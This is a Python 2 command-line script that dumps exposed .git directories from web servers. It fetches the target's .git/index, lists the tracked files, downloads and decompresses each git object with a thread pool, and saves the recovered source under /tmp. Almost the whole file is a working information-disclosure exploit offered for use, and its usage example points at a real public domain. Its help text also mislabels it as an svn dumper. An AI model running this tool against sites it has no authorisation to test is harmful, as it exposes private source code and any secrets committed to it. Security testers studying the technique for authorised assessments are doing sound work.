#!/usr/bin/env python2
# -*- coding: utf8 -*-

# Author: Nixawk

import requests
import logging
import urlparse
import codecs
import os
import zlib
import re
import threading
import argparse

# third libraries
from parser import parse
from threadpool import NoResultsPending, ThreadPool, makeRequests


logging.basicConfig(level=logging.DEBUG, format="[+] %(message)s")
logger = logging.getLogger('git_dump')


class git(object):
    def __init__(self):
        """dump git disclosure files
        """
        logger.debug("git dump tool initializes")
        self.giturls = []
        self.githost = ""
        self.prevurl = ""
        self.output = ""

    def request(self, url, timeout=5):
        """send http request
        """

        logger.debug("send git http request")
        return requests.get(
            url, verify=False,
            allow_redirects=False, timeout=timeout)

    def createdir(self, dir):
        """create direcroty if it does not exists
        """
        logger.debug("check directory if exists or not")
        if not os.path.exists(dir):
            os.makedirs(dir)

        return dir

    def savefile(self, filepath, data):
        """write data to local file
        """
        logger.debug("save file %s" % filepath)

        self.createdir(os.path.dirname(filepath))

        # https://pymotw.com/2/codecs/
        with codecs.open(filepath, 'w') as f:
            f.write(data)

    def index(self, url, output="/tmp"):
        """parse /.git/index
        """
        logger.debug("request - .git/index")

        if not self.output:
            self.output = output

        self.githost = urlparse.urlparse(url).netloc
        resp = self.request("%s/.git/index" % url)

        if not self.prevurl:
            self.prevurl = url

        if resp.status_code != 200:
            logger.info("(%s) - %s" % (resp.status_code, url))
        else:
            logger.info(url)
            path = "%s/%s/index" % (output, self.githost)
            self.savefile(path, resp.content)

            for entry in parse(path):
                if 'sha1' in entry.keys():
                    sha1hash = entry['sha1'].strip()
                    uripath = entry['name']

                    # logger.info("%s: \t%s" % (hash, uripath))

                    if uripath not in self.giturls:
                        git_uripath = "%s/.git/objects/%s/%s" % (
                            self.prevurl, sha1hash[:2], sha1hash[2:])

                        logger.info(git_uripath)

                        self.giturls.append((uripath, git_uripath))

        return self.giturls

    def callback(self, filepath, uripath):
        localpth = "%s/%s" % (self.output, filepath)

        resp = self.request(uripath)

        if resp.status_code == 200:
            data = zlib.decompress(resp.content)
            data = re.sub('blob \d+\00', '', data)
            self.savefile(localpth, data)

    def print_result(self, request, result):
        print "**** Result from request #%s: %r" % (
            request.requestID, result)

    def handle_exception(self, request, exc_info):
        if not isinstance(exc_info, tuple):
            # Something is seriously wrong...
            print request
            print exc_info
            raise SystemExit
        print "**** Exception occured in request #%s: %s" % \
            (request.requestID, exc_info)

    def gits_download(self, url, output="/tmp", threads=20):

        if not self.output:
            self.output = output

        results = self.index(url, output=output)

        if not results:
            return

        args = [((i[0], i[1]), {}) for i in self.giturls]

        # ... and build a WorkRequest object for each item in data
        requests = makeRequests(self.callback,
                                args,
                                self.print_result,
                                self.handle_exception)

        main = ThreadPool(threads)

        for req in requests:
            main.putRequest(req)
            print "Work request #%s added." % req.requestID

        i = 0
        while True:
            try:
                main.poll()
                print "Main thread working...",
                print "(active worker threads: %i)" % (
                    threading.activeCount()-1, )
                if i == 10:
                    print "**** Adding 3 more worker threads..."
                    main.createWorkers(3)
                if i == 20:
                    print "**** Dismissing 2 worker threads..."
                    main.dismissWorkers(2)
                i += 1
            except KeyboardInterrupt:
                print "**** Interrupted!"
                break
            except NoResultsPending:
                print "**** No pending results."
                break
        if main.dismissedWorkers:
            print "Joining all dismissed worker threads..."
            main.joinAllDismissedWorkers()


def console_ui(args):
    if not args.threads:
        args.threads = 20

    if not args.url:
        print "[-] Please a url for git disclosure test / -h for more details"
        return

    try:
        g = git()
        g.gits_download(args.url, output="/tmp", threads=args.threads)
    except KeyboardInterrupt:
        pass


def main():
    desc = "Description: \n\t%(prog)s - svn dump tools"
    usage = "\n\tpython %(prog)s -u http://www.google.com"

    parser = argparse.ArgumentParser(description=desc, usage=usage)
    parser.add_argument('-u', help='target url which disclouse svn entries',
                        metavar='url', dest='url', action='store')

    parser.add_argument('-t', help='threads for scan',
                        metavar='threads', dest='threads', action='store')

    args = parser.parse_args()

    console_ui(args)


if __name__ == "__main__":
    main()
